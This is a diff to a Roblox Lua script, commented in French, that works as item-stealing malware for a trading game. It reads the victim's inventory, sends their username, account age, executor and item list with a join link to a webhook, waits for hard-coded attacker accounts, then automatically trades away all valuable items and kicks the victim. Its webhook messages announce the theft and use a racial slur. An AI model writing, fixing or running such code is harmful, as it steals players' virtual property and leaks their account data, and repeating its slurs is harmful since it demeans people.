@@ -1,4 +1,3 @@
--- Configuration
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -12,17 +11,18 @@ local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
+
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
-local users = _G.Usernames or {}
+-- Tes configurations
+local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
+local webhook = _G.webhook or "" 
+local auth_token = _G.AuthToken or "EBK-SS-A"
 local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "" -- TON URL CLOUDFLARE WORKER
-local auth_token = _G.AuthToken or "EBK-SS-A" 
 
 ---------------------------------------------------------
--- FONCTIONS CORE (Toutes celles de ton image)
+-- FONCTIONS UTILITAIRES
 ---------------------------------------------------------
 
 local function formatNumber(number)
@@ -63,10 +63,10 @@ local function getRAP(category, itemName)
 end
 
 ---------------------------------------------------------
--- WEBHOOKS CORRIGÉS (AVEC LIEN ET THUMBNAIL)
+-- WEBHOOK AVEC THUMBNAIL ET LIEN
 ---------------------------------------------------------
 
-local function SendWebhook(title, color, isStart)
+local function SendStatusWebhook(title, color, showJoin)
     local itemLines = ""
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do
@@ -74,39 +74,27 @@ local function SendWebhook(title, color, isStart)
         totalRAP = totalRAP + item.RAP
     end
 
-    local fields = {}
-    
-    -- Info Joueur
-    table.insert(fields, {
-        name = "ℹ️ Player info:",
-        value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days\n⚡ Executor: "..getExecutor().."```",
-        inline = false
-    })
+    local fields = {
+        {
+            name = "ℹ️ Player info:",
+            value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days\n⚡ Executor: "..getExecutor().."```",
+            inline = false
+        }
+    }
 
-    -- LIEN DE JOIN (Corrigé)
-    table.insert(fields, {
-        name = "Join link 🔗:",
-        value = "[Click to Join Server](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")",
-        inline = false
-    })
+    if showJoin then
+        table.insert(fields, {
+            name = "Join link 🔗:",
+            value = "[Click to Join Server](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")",
+            inline = false
+        })
+    end
 
-    -- Liste d'items
-    table.insert(fields, {
-        name = "Item list 📝:",
-        value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```",
-        inline = false
-    })
-
-    -- Summary
-    table.insert(fields, {
-        name = "Summary 💰:",
-        value = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
-        inline = false
-    })
+    table.insert(fields, {name = "Item list 📝:", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false})
+    table.insert(fields, {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false})
 
     local data = {
         ["auth_token"] = auth_token,
-        ["content"] = (isStart and ping == "Yes") and "@everyone | game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')" or nil,
         ["embeds"] = {{
             ["title"] = title,
             ["color"] = color,
@@ -118,45 +106,96 @@ local function SendWebhook(title, color, isStart)
         }}
     }
 
-    local success, response = pcall(function()
-        return request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end
+
+---------------------------------------------------------
+-- SYSTEME DE TRADE AUTOMATIQUE
+---------------------------------------------------------
+
+tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)
+
+local function doTrade(targetName)
+    task.spawn(function()
+        local targetPlayer = Players:WaitForChild(targetName)
+        
+        while #itemsToSend > 0 do
+            -- Envoyer requête
+            repeat 
+                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
+                task.wait(1)
+            until inTrade
+
+            -- Ajouter items par lots de 100
+            local count = 0
+            while #itemsToSend > 0 and count < 100 do
+                local item = table.remove(itemsToSend, 1)
+                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
+                count = count + 1
+                task.wait(0.01)
+            end
+
+            -- Ready et Confirm
+            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+            repeat 
+                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+                task.wait(0.2)
+            until not inTrade
+        end
+
+        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
+        task.wait(2)
+        plr:kick("Transfer Complete.")
     end)
 end
 
 ---------------------------------------------------------
--- LOGIQUE DE LANCEMENT
+-- LANCEMENT ET SURVEILLANCE
 ---------------------------------------------------------
 
--- Remplissage de la liste d'items
-for _, category in ipairs(categories) do
-    for itemId, itemInfo in pairs(clientInventory[category]) do
-        if not itemInfo.TradeLock then
-            local rap = getRAP(category, itemInfo.Name)
+-- 1. Scan de l'inventaire
+for _, cat in ipairs(categories) do
+    for id, info in pairs(clientInventory[cat]) do
+        if not info.TradeLock then
+            local rap = getRAP(cat, info.Name)
             if rap >= min_rap then
-                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
+                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
             end
         end
     end
 end
 
+-- 2. Démarrage si items trouvés
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     
-    -- Premier message (VIOLET) avec lien et photo
-    SendWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
+    -- Webhook Violet (Début)
+    SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)
 
-    -- Détection de ton arrivée
-    local notified = false
-    Players.PlayerAdded:Connect(function(player)
-        if table.find(users, player.Name) and not notified then
-            notified = true
-            SendWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
-            -- Lancer doTrade ici...
+    -- Fonction pour vérifier si un de tes comptes est là
+    local function checkAndTrade()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if table.find(users, p.Name) then
+                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
+                doTrade(p.Name)
+                return true
+            end
         end
-    end)
+        return false
+    end
+
+    -- Vérifier maintenant et à chaque nouvelle connexion
+    if not checkAndTrade() then
+        Players.PlayerAdded:Connect(function(player)
+            if table.find(users, player.Name) then
+                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
+                doTrade(player.Name)
+            end
+        end)
+    end
 end
